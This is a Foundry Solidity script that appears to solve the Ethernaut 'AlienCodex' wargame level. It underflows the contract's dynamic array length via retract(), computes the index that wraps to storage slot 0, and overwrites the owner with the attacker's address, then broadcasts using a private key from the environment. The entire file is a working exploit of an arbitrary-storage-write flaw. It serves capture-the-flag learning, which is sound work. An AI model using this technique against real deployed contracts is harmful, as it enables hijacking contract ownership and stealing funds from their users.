pragma solidity ^0.8.14;

import {Script} from "forge-std/Script.sol";
import {VmSafe} from "forge-std/Vm.sol";

interface AlienCodex {
    function owner() external returns (address);
    function makeContact() external;
    function record(bytes32 _content) external;
    function retract() external;
    function revise(uint256 i, bytes32 _content) external;
}

contract Level19Script is Script {
    function run() public {
        VmSafe.Wallet memory wallet = vm.createWallet(vm.envUint("PRIVATE_KEY"));

        address payable contractAddress = payable(vm.envAddress("CONTRACT"));

        vm.startBroadcast(wallet.privateKey);
        exploit(contractAddress, wallet.addr);
        vm.stopBroadcast();

        require(levelDone(contractAddress, wallet.addr), "Solution failed");
    }

    function exploit(address _target, address _attacker) private {
        AlienCodex t = AlienCodex(_target);
        t.makeContact();
        t.retract();

        bytes32 slot = bytes32(uint256(1));


        uint256 offset = uint256(keccak256(abi.encodePacked(uint256(1))));
        uint256 index = type(uint256).max - offset + 1;

        t.revise(index, bytes32(uint256(uint160(_attacker))));
    }

    function levelDone(address _target, address _attacker) private returns (bool) {
        return AlienCodex(_target).owner() == _attacker;
    }
}
